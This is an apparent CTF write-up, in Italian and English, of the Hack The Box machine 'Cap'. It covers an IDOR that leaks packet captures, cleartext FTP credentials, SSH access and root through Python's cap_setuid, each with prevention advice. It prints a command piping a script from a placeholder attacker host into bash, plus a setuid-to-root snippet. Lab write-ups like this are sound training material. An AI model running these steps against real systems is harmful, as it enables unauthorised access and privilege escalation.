### **Write-up HTB Machine "Cap"**

#### **1. Panoramica della Macchina**
- **Difficoltà**: Facile (Linux)
- **Servizi Principali**: HTTP (Network Capture Tool), FTP, SSH
- **Vulnerabilità Chiave**: IDOR → Credenziali in chiaro → Escalation privilegi via capability `CAP_SETUID`

#### **2. Riepilogo dell'Attacco**
1. **Enumeration**: Scansione con Nmap rivela porte aperte (21/FTP, 22/SSH, 80/HTTP).
2. **IDOR Exploit**: Manipolazione parametro ID per scaricare PCAP non autorizzati.
3. **Analisi PCAP**: Identificazione credenziali FTP/SSH in chiaro.
4. **Foothold**: Accesso SSH con credenziali rubate.
5. **Privilege Escalation**: Sfruttamento della capability `CAP_SETUID` assegnata a Python.

---

#### **3. Vulnerabilità IDOR: Dettagli Tecnici**
**Definizione**:  
L'Insecure Direct Object Reference (IDOR) permette a un utente di accedere a risorse non autorizzate manipolando identificatori (es: numeri progressivi).

**Esempio Pratico**:  
```
http://10.10.10.56/data/[ID]
```
Modificando `[ID]` (es: da 2 a 1 o 3), è possibile scaricare PCAP appartenenti ad altri utenti.

**Impatto**:  
- Esposizione credenziali FTP: `utente:password`
- Accesso a dati sensibili di rete

**Prevenzione**:  
- Validazione autorizzazioni lato server
- Utilizzo di UUID non sequenziali
- Crittografia del traffico (es: SFTP invece di FTP)

---

#### **4. Walkthrough dell'Exploit**

**Step 1: Scansione Iniziale**  
```bash
nmap -sV -Pn 10.10.10.56
```
**Risultati**:  
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1
80/tcp open  http    gunicorn
```

**Step 2: Scoperta IDOR**  
1. Visitare `http://10.10.10.56/data/2`
2. Modificare manualmente l'ID nell'URL:
   ```
   http://10.10.10.56/data/1 → PCAP di un altro utente
   ```

**Step 3: Analisi PCAP con Wireshark**  
- Filtro FTP: `ftp.request.command == "PASS"`
- Credenziali esposte:  
  ```
  USER: utente
  PASS: password123!
  ```

**Step 4: Accesso SSH**  
```bash
ssh utente@10.10.10.56
```

---

#### **5. Privilege Escalation (CAP_SETUID)**
**Identificazione della Vulnerability**:  
```bash
# Creazione di un server HTTP che serve il contenuto della directory corrente sulla macchina attaccante
# dove ho scaricato linpeas.sh
python -m http.server 80

# Esecuzione linPEAS
curl http://<IP_ATTACCANTE>/linpeas.sh | bash
```
**Finding Critico**:  
```
╔══════════╣ Capabilities
/usr/bin/python3.8 = cap_setuid+ep
```

**Exploit con Python**:  
```python
import os
os.setuid(0)  # Imposta UID a root (0)
os.system("/bin/bash")
```
**Risultato**:  
```
root@cap:/home/utente# id
uid=0(root) gid=1000(utente)
```

---

#### **6. Raccomandazioni di Sicurezza**
1. **FTP**: Sostituire con SFTP/FTPS
2. **IDOR**: Implementare controlli di autorizzazione
3. **Capabilities**: Rimuovere `CAP_SETUID` da Python

---

### **English Version: HTB Machine "Cap" Write-up**

#### **1. Machine Overview**
- **Difficulty**: Easy (Linux)
- **Key Services**: HTTP (Network Capture Tool), FTP, SSH
- **Critical Vulnerabilities**: IDOR → Cleartext Credentials → CAP_SETUID Privilege Escalation

#### **2. Attack Summary**
1. **Enumeration**: Nmap scan reveals open ports (21/FTP, 22/SSH, 80/HTTP).
2. **IDOR Exploit**: Parameter tampering to download unauthorized PCAPs.
3. **PCAP Analysis**: FTP/SSH credentials disclosure.
4. **Foothold**: SSH access using stolen credentials.
5. **Privilege Escalation**: Exploiting Python's `CAP_SETUID` capability.

---

#### **3. IDOR Vulnerability: Technical Details**
**Definition**:  
Insecure Direct Object Reference (IDOR) allows unauthorized resource access by manipulating object identifiers.

**Practical Example**:  
```
http://10.10.10.56/data/[ID]
```
Modifying `[ID]` (e.g., from 2 to 1/3) enables downloading other users' PCAPs.

**Impact**:  
- FTP credentials exposure: `user:password123!` 
- Network sensitive data leakage

**Prevention**:  
- Implement server-side authorization checks
- Use non-sequential UUIDs
- Encrypt network traffic (e.g., SFTP instead of FTP)

---

#### **4. Exploit Walkthrough**

**Step 1: Initial Scanning**  
```bash
nmap -sV -Pn 10.10.10.56
```
**Findings**:  
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1
80/tcp open  http    gunicorn
```

**Step 2: IDOR Discovery**  
1. Visit `http://10.10.10.56/data/2`
2. Manually tamper with ID parameter:
   ```
   http://10.10.10.56/data/1 → Another user's PCAP
   ```

**Step 3: PCAP Analysis with Wireshark**  
- FTP filter: `ftp.request.command == "PASS"`
- Exposed credentials:  
  ```
  USER: utente
  PASS: password123!
  ```

**Step 4: SSH Access**  
```bash
ssh utente@10.10.10.56
```

---

#### **5. Privilege Escalation (CAP_SETUID)**
**Vulnerability Identification**:  
```bash
# Run linPEAS
curl http://<ATTACKER_IP>/linpeas.sh | bash
```
**Critical Finding**:  
```
╔══════════╣ Capabilities
/usr/bin/python3.8 = cap_setuid+ep
```

**Python Exploit**:  
```python
import os
os.setuid(0)  # Set UID to root (0)
os.system("/bin/bash")
```
**Result**:  
```
root@cap:/home/utente# id
uid=0(root) gid=1000(utente)
```

---

#### **6. Security Recommendations**
1. **FTP**: Replace with SFTP/FTPS
2. **IDOR**: Implement authorization checks
3. **Capabilities**: Remove `CAP_SETUID` from Python

---

### **Note Finali/Additional Notes**
- **Proof Screenshots**: [Anteprime GitHub] (Inserisci immagini della flag e dell'output di linPEAS)
- **HTB Profile**: [Il tuo profilo pubblico] (Aggiungi link)
- **Struttura Repository**:  
  ```
  /Cap
  ├── PCAP-Analysis
  ├── Exploit-Scripts
  └── Prevention-Guide.md
  ```

**Formattazione Professionale**:  
- Usa [Markdown](https://www.markdownguide.org/) per titoli, blocchi di codice e tabelle
- Includi badge dinamici con [Shields.io](https://shields.io/):  
  ```
  ![HTB Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
  ![CVE](https://img.shields.io/badge/CWE-639%20(IDOR)-red)
  ```
